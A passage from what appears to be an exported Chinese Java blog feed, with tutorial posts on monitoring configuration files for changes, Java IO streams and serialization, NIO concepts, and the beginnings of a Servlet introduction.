FileConfRead implements IConfRead { public Config initConf(String path) { try { Properties properties = read(path); Config config = new Config(); config.setSleep(properties.getProperty(\"sleep\"), 0); config.setEmptyQueueWaitTime(properties.getProperty(\"emptyQueueWaitTime\"), 200); return config; } catch (Exception e) { log.error(\"init config from file: {} error! e: {}\", path, e); return new Config(); } } private Properties read(String fileName) throws IOException { try (InputStream inputStream = FileReadUtil.getStreamByFileName(fileName)) { Properties pro = new Properties(); pro.load(inputStream); return pro; } } private File file; private long lastTime; public void registerCheckTask(final String path) { try { file = FileReadUtil.getFile(path); lastTime = file.lastModified(); ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(1); scheduledExecutorService.scheduleAtFixedRate(() -&gt; { if (file.lastModified() &gt; lastTime) { lastTime = file.lastModified(); ConfigWrapper.getInstance().post(new ConfigWrapper.UpdateConfEvent()); } }, 1, 1, TimeUnit.MINUTES); } catch (Exception e) { throw new RuntimeException(e); } }} 实现类主要继承接口 IConfRead, 接口中定义了两个方法，一个用于获取配置信息，一个用于注册配置信息的变动监听事件 123456789101112131415161718public interface IConfRead { /** * 初始化配置信息 * * @param var * @return */ Config initConf(String var); /** * 注册配置信息更新检测任务 * * @param path */ void registerCheckTask(final String path);} 回到具体的实现，读取配置文件信息比较简单，直接使用jdk的Properties文件的读写方式，接下来则是注册监听事件的实现上，我们的设计思路如下: 获取配置文件的更新时间 每隔一段时间主动去查看下配置文件的更新时间，判断是否更新过 若更新，则重新加载配置文件，覆盖之前的 若无更新，直接放过 2. 配置类 Config 这里定义所有的配置信息，方便后续的维护和查阅 12345678910111213141516171819202122232425@Getter@Setter@ToStringpublic class Config { /** * 爬取任务的间隔时间 */ private long sleep; /** * 从队列中获取任务，返回空时，等待时间之后再进行重试 */ private long emptyQueueWaitTime; public void setSleep(String str, long sleep) { this.sleep = NumUtils.str2long(str, sleep); } public void setEmptyQueueWaitTime(String str, long emptyQueueWaitTime) { this.emptyQueueWaitTime = NumUtils.str2long(str, emptyQueueWaitTime); }} 3. 配置信息获取封装类 ConfigWrapper 这里封装了获取配置信息的接口，内部维护配置信息的变更事件，我们采用EventBus来实现事件的监听 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768@Slf4jpublic class ConfigWrapper { private static final String CONFIG_PATH = \"conf/crawler.properties\"; private EventBus eventBus; private IConfRead confRead; private Config config; private static volatile ConfigWrapper instance; private ConfigWrapper() { confRead = new FileConfRead(); confRead.registerCheckTask(CONFIG_PATH); config = confRead.initConf(CONFIG_PATH); // 注册监听器 eventBus = new EventBus(); eventBus.register(this); } public static ConfigWrapper getInstance() { if (instance == null) { synchronized (ConfigWrapper.class) { if (instance == null) { instance = new ConfigWrapper(); } } } return instance; } @Subscribe public void init(UpdateConfEvent event) { config = confRead.initConf(event.conf); if (log.isDebugEnabled()) { log.debug(\"time:{} processor:{} update config! new config is: {}\", event.now, event.operator, config); } } public Config getConfig() { return config; } public void post(Object event) { eventBus.post(event); } @Getter @Setter public static class UpdateConfEvent { private long now = System.currentTimeMillis(); private String operator = \"System\"; private String conf = CONFIG_PATH; }} 3. 源码地址项目地址： https://github.com/liuyueyi/quick-crawler 日志埋点对应的tag: v0.006 动态配置对应的tag: v0.007 相关博文Quick-Crawel爬虫系列博文 II. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2017/07/27/Java-动手写爬虫-四、日志埋点输出-动态配置支持/"},{"title":"Java可以如何实现文件变动的监听","text":"Java可以如何实现文件变动的监听应用中使用logback作为日志输出组件的话，大部分会去配置 logback.xml 这个文件，而且生产环境下，直接去修改logback.xml文件中的日志级别，不用重启应用就可以生效 那么，这个功能是怎么实现的呢？ I. 问题描述及分析针对上面的这个问题，首先抛出一个实际的case，在我的个人网站 Z+中，所有的小工具都是通过配置文件来动态新增和隐藏的，因为只有一台服务器，所以配置文件就简化的直接放在了服务器的某个目录下 现在的问题时，我需要在这个文件的内容发生变动时，应用可以感知这种变动，并重新加载文件内容，更新应用内部缓存 一个最容易想到的方法，就是轮询，判断文件是否发生修改，如果修改了，则重新加载，并刷新内存，所以主要需要关心的问题如下： 如何轮询？ 如何判断文件是否修改？ 配置异常，会不会导致服务不可用？（即容错，这个与本次主题关联不大，但又比较重要…） II. 设计与实现问题抽象出来之后，对应的解决方案就比较清晰了 如何轮询 ？ –》 定时器 Timer, ScheduledExecutorService 都可以实现 如何判断文件修改？ –》根据 java.io.File#lastModified 获取文件的上次修改时间，比对即可 那么一个很简单的实现就比较容易了: 12345678910111213141516171819202122232425262728293031public class FileUpTest { private long lastTime; @Test public void testFileUpdate() { File file = new File(\"/tmp/alarmConfig\"); // 首先文件的最近一次修改时间戳 lastTime = file.lastModified(); // 定时任务，每秒来判断一下文件是否发生变动，即判断lastModified是否改变 ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(1); scheduledExecutorService.scheduleAtFixedRate(new Runnable() { @Override public void run() { if (file.lastModified() &gt; lastTime) { System.out.println(\"file update! time : \" + file.lastModified()); lastTime = file.lastModified(); } } },0, 1, TimeUnit.SECONDS); try { Thread.sleep(1000 * 60); } catch (InterruptedException e) { e.printStackTrace(); } }} 上面这个属于一个非常简单，非常基础的实现了，基本上也可以满足我们的需求，那么这个实现有什么问题呢？ 定时任务的执行中，如果出现了异常会怎样？ 对上面的代码稍作修改 12345678910111213141516171819202122232425262728293031323334public class FileUpTest { private long lastTime; private void ttt() { throw new NullPointerException(); } @Test public void testFileUpdate() { File file = new File(\"/tmp/alarmConfig\"); lastTime = file.lastModified(); ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(1); scheduledExecutorService.scheduleAtFixedRate(new Runnable() { @Override public void run() { if (file.lastModified() &gt; lastTime) { System.out.println(\"file update! time : \" + file.lastModified()); lastTime = file.lastModified(); ttt(); } } }, 0, 1, TimeUnit.SECONDS); try { Thread.sleep(1000 * 60 * 10); } catch (InterruptedException e) { e.printStackTrace(); } }} 实际测试，发现只有首次修改的时候，触发了上面的代码，但是再次修改则没有效果了，即当抛出异常之后，定时任务将不再继续执行了，这个问题的主要原因是因为 ScheduledExecutorService 的原因了 直接查看ScheduledExecutorService的源码注释说明 If any execution of the task encounters an exception, subsequent executions are suppressed.Otherwise, the task will only terminate via cancellation or termination of the executor.即如果定时任务执行过程中遇到发生异常，则后面的任务将不再执行。 所以，使用这种姿势的时候，得确保自己的任务不会抛出异常，否则后面就没法玩了 对应的解决方法也比较简单，整个catch一下就好 III. 进阶版前面是一个基础的实现版本了，当然在java圈，基本上很多常见的需求，都是可以找到对应的开源工具来使用的，当然这个也不例外，而且应该还是大家比较属性的apache系列 首先maven依赖 12345&lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.6&lt;/version&gt;&lt;/dependency&gt; 主要是借助这个工具中的 FileAlterationObserver, FileAlterationListener, FileAlterationMonitor 三个类来实现相关的需求场景了，当然使用也算是很简单了，以至于都不太清楚可以再怎么去说明了，直接看下面从我的一个开源项目quick-alarm中拷贝出来的代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class PropertiesConfListenerHelper { public static boolean registerConfChangeListener(File file, Function&lt;File, Map&lt;String, AlarmConfig&gt;&gt; func) { try { // 轮询间隔 5 秒 long interval = TimeUnit.SECONDS.toMillis(5); // 因为监听是以目录为单位进行的，所以这里直接获取文件的根目录 File dir = file.getParentFile(); // 创建一个文件观察器用于过滤 FileAlterationObserver observer = new FileAlterationObserver(dir, FileFilterUtils.and(FileFilterUtils.fileFileFilter(), FileFilterUtils.nameFileFilter(file.getName()))); //设置文件变化监听器 observer.addListener(new MyFileListener(func)); FileAlterationMonitor monitor = new FileAlterationMonitor(interval, observer); monitor.start(); return true; } catch (Exception e) { log.error(\"register properties change listener error! e:{}\", e); return false; } } static final class MyFileListener extends FileAlterationListenerAdaptor { private Function&lt;File, Map&lt;String, AlarmConfig&gt;&gt; func; public MyFileListener(Function&lt;File, Map&lt;String, AlarmConfig&gt;&gt; func) { this.func = func; } @Override public void onFileChange(File file) { Map&lt;String, AlarmConfig&gt; ans = func.apply(file); // 如果加载失败，打印一条日志 log.warn(\"PropertiesConfig changed! reload ans: {}\", ans); } }} 针对上面的实现，简单说明几点： 这个文件监听，是以目录为根源，然后可以设置过滤器，来实现对应文件变动的监听 如上面registerConfChangeListener方法，传入的file是具体的配置文件，因此构建参数的时候，捞出了目录，捞出了文件名作为过滤 第二参数是jdk8语法，其中为具体的读取配置文件内容，并映射为对应的实体对象 一个问题，如果 func方法执行时，也抛出了异常，会怎样？ 实际测试表现结果和上面一样，抛出异常之后，依然跪，所以依然得注意，不要跑异常 那么简单来看一下上面的实现逻辑，直接扣出核心模块 1234567891011121314151617181920212223public void run() { while(true) { if(this.running) { Iterator var1 = this.observers.iterator(); while(var1.hasNext()) { FileAlterationObserver observer = (FileAlterationObserver)var1.next(); observer.checkAndNotify(); } if(this.running) { try { Thread.sleep(this.interval); } catch (InterruptedException var3) { ; } continue; } } return; }} 从上面基本上一目了然，整个的实现逻辑了，和我们的第一种定时任务的方法不太一样，这儿直接使用线程，死循环，内部采用sleep的方式来来暂停，因此出现异常时，相当于直接抛出去了，这个线程就跪了 JDK版本jdk1.7，提供了一个WatchService，也可以用来实现文件变动的监听，之前也没有接触过，看到说明，然后搜了一下使用相关，发现也挺简单的，同样给出一个简单的示例demo 1234567891011121314151617181920212223242526272829303132333435@Testpublic void testFileUpWather() throws IOException { // 说明，这里的监听也必须是目录 Path path = Paths.get(\"/tmp\"); WatchService watcher = FileSystems.getDefault().newWatchService(); path.register(watcher, ENTRY_MODIFY); new Thread(() -&gt; { try { while (true) { WatchKey key = watcher.take(); for (WatchEvent&lt;?&gt; event : key.pollEvents()) { if (event.kind() == OVERFLOW) { //事件可能lost or discarded continue; } Path fileName = (Path) event.context(); System.out.println(\"文件更新: \" + fileName); } if (!key.reset()) { // 重设WatchKey break; } } } catch (Exception e) { e.printStackTrace(); } }).start(); try { Thread.sleep(1000 * 60 * 10); } catch (InterruptedException e) { e.printStackTrace(); }} IV. 小结使用Java来实现配置文件变动的监听，主要涉及到的就是两个点 如何轮询： 定时器（Timer, ScheduledExecutorService）, 线程死循环+sleep 文件修改： File#lastModified 整体来说，这个实现还是比较简单的，无论是自定义实现，还是依赖 commos-io来做，都没太大的技术成本，但是需要注意的一点是： 千万不要在定时任务 or 文件变动的回调方法中抛出异常！！！ 为了避免上面这个情况，一个可以做的实现是借助EventBus的异步消息通知来实现，当文件变动之后，发送一个消息即可，然后在具体的重新加载文件内容的方法上，添加一个 @Subscribe注解即可，这样既实现了解耦，也避免了异常导致的服务异常 （如果对这个实现有兴趣的可以评论说明） V. 其他参考项目 项目： quick-alarm 测试类： FileUpTest.java 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/02/08/Java可以如何实现文件变动的监听/"},{"title":"Java学习之IO相关","text":"Java IO学习小结IO操作算是java的一个基本知识点了，比如我们常见的网络IO，文件读写等，而且这一块基本上大家并不会频繁的来操作，大多会用一些封装得好用的工具来代替，某些时候真的需要做的时候，基本上也很难一下子很顺利的写完 本篇将主要集中在： 几种IO分类 字节IO和字符IO的转换 装饰类IO是什么 序列化的实现机制 I. IO分类Java中的IO操作，一般都是基于流进行，以输入输出流进行分类可以分为 字节流：InputStream, OutputStream 字符流：Reader, Writer 从数据源进行分类，又可以区分为： 文件读写： FileInputStream, FileOutputStream，FileReader 字符串流： StringBufferInputStream， StringReader 数组流： ByteArrayInputStream 网络： Socket 从去向分析，就是输入流和输出流： 输入流： xxxInputStream, xxxReader 输出流: xxxOutputStream, xxxWriter II. IO流的基本知识点IO操作，最主要的一点就是需要清晰如何使用了，一般来讲，网络或文件读写，都是基于字节进行交互的，但实际上为了能友好的读取或写入信息，一般都是字符方式，由字符到字节之间则需要一个编码规则的映射 所有，很简单就可以知晓，这里至少有三种不同应用场景的类和一种设计模式 字节流 字符流 字节映射字符流 （适配器模式） 1. 基本使用以常见的文件读写为例进行说明，一般的读写操作是啥样的 123456789101112131415161718@Testpublic void testPrintFile() throws IOException { String fileName = \"/tmp/test.d\"; File file = new File(fileName); InputStream input = new FileInputStream(file); InputStreamReader reader = new InputStreamReader(input, Charset.forName(\"utf-8\")); BufferedReader bufferedReader = new BufferedReader(reader); String ans = bufferedReader.readLine(); while (ans !=null ) { System.out.println(ans); ans = bufferedReader.readLine(); } bufferedReader.close(); reader.close(); input.close();} 上面的流程基本上就下面五步： 创建一个File对象 包装为IO流： new FileInputStream(new File(&quot;test.d&quot;)) 字节流转换为字符流: new InputStreamReader(input, Charset.forName(&quot;utf-8&quot;)) 字符流使用缓冲修饰，支持读一行 关闭流 基本上上面这个套路是比较适合常见的IO操作的，那么为什么是这么个流程呢？这个流程中又有些什么有意思的东西呢？ 2. IO流使用姿势分析 声明：下面这一段纯属个人理解，如有不误，请不吝指正 对操作系统而言（网络传输也一样），他们关心的是一个字节一个字节的行为，所以与它们打交道，就需要遵循他们的规则来办事，使用字节来操作，所以最开始我们都是采用字节流来定义与数据源的交互规则 然而字节流虽好，但是所有的数据最终都是为人服务的，而由于客观原因，不同的国家有不同的语言，为了面向人类的友好，出现了字符这个东西，所以一般我们的操作也更多的是基于字符进行操作 上面这两个出现之后，一个自然而然的东西–&gt;InputStreamReader就出现了，作为字节和字符转换的桥梁 上面这三个可算是一个基本的操作流程了，可以满足我们的输入输出需求，但依然不是特别友好，比如一个一个字符的操作不友好啊，比如我希望过滤某些东西，或者做其他的一些辅助操作之类的，因此就出现了各种装饰流，主要就是提供一些服务方法，增强接口的易用性 简单的使用姿势流图： 123456graph TDA(数据源)--&gt;B(字节流InputStream/OutputStream)B--&gt;C[InputStreamReader/OutputStreamWriter]C--&gt;D[Reader/Writer]D--&gt;E[装饰流]E--&gt;F(关闭) 3. 常见IO类a. 基本介质流与提供读写数据的数据源打交道的流 FileInputStream : 数据源为文件 ByteArrayInputStream: 数据源为byte数组 StringBufferInputStream: StringBuffer作为数据源，已废弃 PipedInputStream：管道，多线程协作使用 使用姿势 123456789101112// 数组byte[] bytes = new byte[]{'a', 'b', 'c', '1', '2'};ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);int a = 0;while((a = byteArrayInputStream.read()) != -1) { System.out.print(a + \" \");}byteArrayInputStream.close();// 输出: 97 98 99 49 50// StringBufferInputStream 已经被废弃 b. 字节字符转换两个: InputStreamReader OutputStreamWriter 使用姿势也比较简单，标准的适配器模式，用构造方法传参即可，下面给出一个demo，结合上面的，实现将数组流的数据写入的文件(说明，下面的实现更多的是为了演示这种用法，实际编码中有较大的优化空间) 123456789101112131415byte[] bytes = new byte[]{'a', 'b', 'c', '1', '2'};ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);File file = new File(\"/tmp/test.d\");OutputStream out = new FileOutputStream(file);Writer writer = new OutputStreamWriter(out);int a = 0;while((a = byteArrayInputStream.read()) != -1) { writer.write(a);}writer.flush();writer.close();byteArrayInputStream.close(); c. 装饰流主要是基于装饰模式，对IO流，增强一些操作方法，最明显的是特征是他们继承自 FilterInputStream，比如我们最常用的BufferedInputStream 和 DataInputStream 基本数据类型读写流: DataInputStream 8中基本类型的读入写出流，没什么好说的 缓存流： BufferedInputStream 为了提升性能引入，避免频繁的磁盘读写 对象流: ObjectInputStream 虽然没有继承自FilterInputStream，依然把它作为装饰流，后面单独说 这里面有必要好好的说到以下 BufferedInputStream，缓冲流的底层原理是什么，又有什么好处，为什么会引入这个？ API解释：在创建 BufferedInputStream时，会创建一个内部缓冲区数组。在读取流中的字节时，可根据需要从包含的输入流再次填充该内部缓冲区，一次填充多个字节。 也就是说，Buffered类初始化时会创建一个较大的byte数组，一次性从底层输入流中读取多个字节来填充byte数组，当程序读取一个或多个字节时，可直接从byte数组中获取，当内存中的byte读取完后，会再次用底层输入流填充缓冲区数组。 以文件读写为例，在实际的落盘和读取过程，这个是加锁阻塞的操作，如果每次都只读1个字节，在大量的读写情况下，这个性能就很脆了 加上这个缓冲之后呢？在一次加锁的过程中，尽量多的读取数据，放在本地内存，这样即便是在使用的地方一个一个的获取，也不会与其他的任务产生竞争，所有有效的提高了效率 III. 序列化在平常的工作中，基本上离不开序列化了，比如web应用中，最常见的基于JSON的数据结构交互，就算是一种JSON序列化方式；当然我们这里谈的序列化主要是JDK原生的方式 1. 背景出现序列化需求的背景比较清晰，我们希望某些对象可以更方便的共享，如即便程序over了，它们可以以某种方式存在（比如写在一个临时文件中），如RPC中传参和返回等 使用时注意事项 一个类需要序列化，需要实现 Serializable 这个空接口，会告知编译器对它进行特殊处理 一个友好的习惯是，在可序列化的类中，定义一个 static final long serialVersionUID transient变量可标识出来不被序列化的字段 2. 实现给出一个使用case 1234567891011121314151617181920212223242526272829303132333435363738394041public static class Demo implements Serializable { private String name; private Integer age; private boolean isBoy; private transient String ignore; public Demo(String name, Integer age, boolean isBoy, String ignore) { this.name = name; this.age = age; this.isBoy = isBoy; this.ignore = ignore; } @Override public String toString() { return \"Demo{\" + \"name='\" + name + '\\'' + \", age=\" + age + \", isBoy=\" + isBoy + \", ignore='\" + ignore + '\\'' + '}'; }}@Testpublic void testObjStream() throws IOException, ClassNotFoundException { Demo demo = new Demo(\"测试\", 123, true, \"忽略的一段文本\"); // 将对象写入到文件中 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"/tmp/out.t\")); oos.writeObject(demo); oos.flush(); oos.close(); System.out.println(\"-------- over ----------\"); // 从文件读取 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"/tmp/out.t\")); Object obj = ois.readObject(); System.out.println(\"反序列化: \" + obj + \" \\n类型：\" + obj.getClass().getSimpleName());} 输出结果 123-------- over ----------反序列化: Demo{name=&apos;测试&apos;, age=123, isBoy=true, ignore=&apos;null&apos;} 类型：Demo 对应的文本内容 IV. 小结io可以说是java中最基本的操作方式了，jdk本身设计是比较优雅的，从上面简单的学习就看到了两种设计模式：适配器+装饰器 提到IO，就不能跳过NIO，特别是在实际的工作中，用得非常多的网络交互，现在基本上是Netty占据主流，这个里面又是有不少东西可以学习的，放在下一篇，下面简单回顾下IO流的认知与使用 1. 流分类： 字节流： InputStream , OutputStream 字符流： Reader, Writer 2. 从设计角度分类 介质流：直接与数据源打交道 FileInputStream, StringBufferInputStream(已经不用，改StringBufferReader), ByteArrayInputStream （网络传输的二进制流，基本就是这个） 转换: 字节流和字符流的转换 InputStreamReader, OutputStreamWriter 装饰流: BufferedInputStream, DataInputStream, ObjectInputStream 3. 序列化和反序列化序列化是指将对象输出为二进制流的过程，反序列化则是指将二进制流反序列化为对象的过程 一般序列化的对象需要实现Serializable接口，内部不需要序列化的对象，用transient关键字进行声明 4. IO基本使用姿势介质流与数据源进行交互 –&gt; 转换流包装为字符流 –&gt; 装饰流进行实际操作 –&gt; 关闭流 以文件读写为例: 12345BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(\"test.txt\"), Chaset.forName(\"utf-8\")));String ans = reader.readLine();reader.close(); IV. 其他参考： 深入理解Java中的IO Java IO完全总结（转载） 编程语言的基础——搞定JavaIO 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/18/Java学习之IO相关/"},{"title":"Java学习之NIO相关","text":"Java NIO学习小结前面一篇主要学习了下IO的流式操作，接下来就是重头戏了，NIO，又称为New IO 当然也是得抱着问题来学习这个东西了，希望可以通过本文，可以学习到： 什么是NIO NIO相比较与IO有什么特点 同步，非同步，阻塞，非阻塞是什么鬼 几种IO模型 I. 基本概念首先理解下什么是同步IO,非同步IO，什么是阻塞IO，非阻塞IO，它们两对的主要区别是什么；其次就是五种IO模型 1. 同步/非同步IOa. 同步IO同步，主要是多个线程的执行中，对彼此的执行结果有依赖，即某个线程的执行，必须要求他依赖的线程二执行完毕 同步IO，表示在发起IO操作之后，如果数据没有准备就绪，就需要用户线程轮询的去询问是否准备好，只有准备好之后，将数据从内核拷贝到用户线程 b. 异步IO异步，指多个任务可以并发的执行，他们比吃执行结果，是否执行完毕对其他都没有影响 异步IO，用户线程发起IO操作，该用户线程可以继续执行其他的事情；剩下的数据是否准备完毕，准备完毕之后从内核拷贝到用户都有内核自动完成 c. 区别同步IO和异步IO的主要区别就在于： 用户线程发起IO操作之后，是否可以干其他的事情（同步IO需要轮询判断数据是否准备就绪；异步IO不需关心） 数据从内核拷贝到用户线程 同步IO会阻塞用户线程；异步IO不会 2. 阻塞/非阻塞IOa. 阻塞IO阻塞，指在执行过程中，没有获得预期的结果，就一直阻塞等待获取到结果 阻塞IO，在发起IO请求之后，若数据没有准备好，就一直阻塞等待数据准备完毕 b. 非阻塞IO非阻塞，表示在执行过程中，若某个条件未满足，则直接返回个标识，它继续去干其他的事情 非阻塞IO，在发起IO请求之后，若数据没有准备好，就返回一个对应标识，它继续干其他的事情 3. 五种IO模型a. 阻塞IO模型最传统的IO模型，在读写数据时，未准备就绪，则阻塞用户线程，释放CPU资源，当数据准备就绪之后，内核将数据拷贝到用户线程，用户线程取消阻塞状态 b. 非阻塞IO模型在读写数据时，直接返回结果，如果没有准备好，则自己实现逻辑，轮询的去判断是否准备就绪 当准备完毕之后，再次轮组发起IO请求，就可以将数据拷贝到用户线程 这个过程中，虽然没有释放CPU资源，但是轮询的判断是非常消耗性能的 c. 多路复用IO模型Java NIO实际上就是多路复用IO。 在多路复用IO模型中，会有一个线程不断去轮询多个socket的状态，只有当socket真正有读写事件时，才真正调用实际的IO读写操作。因为在多路复用IO模型中，只需要使用一个线程就可以管理多个socket，系统不需要建立新的进程或者线程，也不必维护这些线程和进程，并且只有在真正有socket读写事件进行时，才会使用IO资源，所以它大大减少了资源占用 在Java NIO中，是通过selector.select()去查询每个通道是否有到达事件，如果没有事件，则一直阻塞在那里，因此这种方式会导致用户线程的阻塞。 d. 信号驱动IO模型在发起IO请求时，注册一个信号驱动钩子，然后自己干自己的事情 当数据准备就绪之后，发送一个信号给用户线程，然后用户线程执行自己注册的钩子，在内部实现真实的IO操作 e. 异步IO模型异步IO模型才是最理想的IO模型，在异步IO模型中，当用户线程发起read操作之后，立刻就可以开始去做其它的事。而另一方面，从内核的角度，当它受到一个asynchronous read之后，它会立刻返回，说明read请求已经成功发起了，因此不会对用户线程产生任何block。然后，内核会等待数据准备完成，然后将数据拷贝到用户线程，当这一切都完成之后，内核会给用户线程发送一个信号，告诉它read操作完成了。也就说用户线程完全不需要实际的整个IO操作是如何进行的，只需要先发起一个请求，当接收内核返回的成功信号时表示IO操作已经完成，可以直接去使用数据了 f. 说明 前面四种都属于同步IO（在内核进行数据拷贝都会引起用户线程阻塞），只有最后一个是异步IO 异步IO和信号驱动IO的主要区别在于具体的数据处理上 II. NIO为了解决传统IO的阻塞问题引入的，主要原理如下: 一个专门的线程来处理所有的 IO 事件，并负责分发 事件驱动机制 线程通讯通过 wait/notify 等方式通讯，较少线程切换 1. 基础知识NIO新定义了三个基本角色：Channel, Buffer, Selector a. Channel类似IO中的流，但又有不同 支持读写（而流是单向的） 与Buffer进行交互（即写入到buffer，从buffer中读取） 支持异步 常见的Channel有四种 FileChannel ： 文件，不支持非阻塞方式 DatagramChannel：UDP网络数据 SocketChannel：TCP读写网络数据 ServerSocketChannel：可以监听新进来的TCP连接，像Web服务器那样。对每一个新进来的连接都会创建一个SocketChannel。 b. Buffer缓冲区，主要有8种: ByteBuffer CharBuffer FloatBuffer DoubleBuffer IntBuffer ShortBuffer LongBuffer MappedByteBuffer 管道的读写是需要借助Buffer来实现的，一般buffer的读写流程： 创建Buffer ByteBuffer buf = ByteBuffer.allocate(48); 写入数据到Buffer 从Channel写到Buffer: channel.read(buf); 直接塞入buffer: buf.put(12); flip() 切换读写模式 将写模式切换到读模式 从Buffer读取数据 从Buffer读数据到Channel：channel.write(buf); 直接读取数据: buf.get() 清空缓存区：clear() 或 compact() clear 清空，但是数据并未清除，会覆盖 compact 将所有未读的数据拷贝到Buffer起始处 额外方法： Buffer.rewind() 将position设回0，所以你可以重读Buffer中的所有数据 limit保持不变，仍然表示能从Buffer中读取多少个元素（byte、char等） Buffer.mark()方法，可以标记Buffer中的一个特定position。之后可以通过调用 Buffer.reset()方法，恢复到Buffer.mark()标记时的position c. selector是Java NIO中能够检测一到多个NIO通道，并能够知晓通道是否为诸如读写事件做好准备的组件 创建 Selector selector = Selector.open(); 注册通道 设置通道为非阻塞 channel.configureBlocking(false); 注册: SelectionKey key = channel.register(selector,Selectionkey.OP_READ); 监听事件 selector.select();当注册的事件到达时，方法返回；否则,该方法会一直阻塞 迭代：selector.selectedKeys().iterator() 获取通道: SelectionKey#channel 通过缓冲区读写数据 III. NIO与IO对比1. Java NIO提供了与标准IO不同的IO工作方式： Channels and Buffers（通道和缓冲区）：标准的IO基于字节流和字符流进行操作的，而NIO是基于通道（Channel）和缓冲区（Buffer）进行操作，数据总是从通道读取到缓冲区中，或者从缓冲区写入到通道中。 Asynchronous IO（异步IO）：Java NIO可以让你异步的使用IO，例如：当线程从通道读取数据到缓冲区时，线程还是可以进行其他事情。当数据被写入到缓冲区时，线程可以继续处理它。从缓冲区写入通道也类似。 Selectors（选择器）：Java NIO引入了选择器的概念，选择器用于监听多个通道的事件（比如：连接打开，数据到达）。因此，单个的线程可以监听多个数据通道。 2. 使用场景NIO 优势在于一个线程管理多个通道；但是数据的处理将会变得复杂； 如果需要管理同时打开的成千上万个连接，这些连接每次只是发送少量的数据，采用这种； 传统IO 适用于一个线程管理一个通道的情况；因为其中的流数据的读取是阻塞的 如果需要管理同时打开不太多的连接，这些连接会发送大量的数据； 3. 区别 IO是面向流的，NIO是面向缓冲区的 Java IO面向流意味着每次从流中读一个或多个字节，直至读取所有字节，它们没有被缓存在任何地方； NIO则能前后移动流中的数据，因为是面向缓冲区的 IO流是阻塞的，NIO流是不阻塞的 Java IO的各种流是阻塞的。这意味着，当一个线程调用read() 或 write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了 Java NIO的非阻塞模式，使一个线程从某通道发送请求读取数据，但是它仅能得到目前可用的数据，如果目前没有数据可用时，就什么都不会获取 非阻塞写也是如此。一个线程请求写入一些数据到某通道，但不需要等待它完全写入，这个线程同时可以去做别的事情。 选择器 Java NIO的选择器允许一个单独的线程来监视多个输入通道，你可以注册多个通道使用一个选择器，然后使用一个单独的线程来“选择”通道 这些通道里已经有可以处理的输入，或者选择已准备写入的通道 这种选择机制，使得一个单独的线程很容易来管理多个通道。 IV. 其他参考 Java NIO：浅析I/O模型 Java NIO原理图文分析及代码实现 Java NIO系列教程（一） Java NIO 概述 Java NIO 与 IO之间的区别 JAVA IO 以及 NIO 理解 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/18/Java学习之NIO相关/"},{"title":"JavaWeb三大组件之Servlet学习","text":"JavaWeb三大组件之Servlet学习 平时直接用springmvc较多，都没怎么接触底层的Servlet，导致对一些基本的知识点了解都不够，所以今天专门的抽出时间来学习一下 带着问题出发，看下可以怎么玩 如何自定义一个Servlet 自定义的Serlvet如何工作 servlet的优先顺序怎么判定 servlet匹配是怎样的 (url-mapping…） 如何获取参数（get请求参数，post请求参数，上传文件） 如何返回数据（返回页面，返回文件，返回二进制） 请求头和返回头的设置 I. 基本知识点1. 什么是ServletServlet是JavaWeb的三大组件之一，它属于动态资源。Servlet的作用是处理请求，服务器会把接收到的请求交给Servlet来处理，在Servlet中通常需要： 接受请求 处理请求 完成响应 2. 怎么玩Servlet一般来讲，创建一个自定义的Servlet有两个步骤，在web.xml中配置serverlt的声明；实现Servlet接口，实现自定义的Servlet逻辑 一个简单的case如下 web.xml中，添加配置 123456789&lt;servlet&gt; &lt;servlet-name&gt;doc-servlet&lt;/servlet-name&gt; &lt;servlet-class&gt;com.yihui.study.DocServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;0&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;doc-servlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/study/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 实现自定义Servlet 1234567891011public class DocServlet extends HttpServlet { protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.setCharacterEncoding(\"utf-8\"); PrintWriter writer = resp.getWriter(); writer.append(\"这是一个自定义servlet\") .append(\"emoj😄==\").flush(); System.out.println(\"hereher!!!!\"); }} 上面这个Servlet，实现了拦截 /study 下的所有请求， 然后返回一段文本，上面作为演示，具体的展开下面说明 3. Servlet接口说明上面是直接继承了HttpServlet，可能没法完全的暴露一个Servlet的具体接口有哪些，以及它的生命周期是怎样的，接下来则直接针对源头进行说明 1234567891011121314151617public interface Servlet { // 初始化 public void init(ServletConfig config) throws ServletException; // 获取配置信息 public 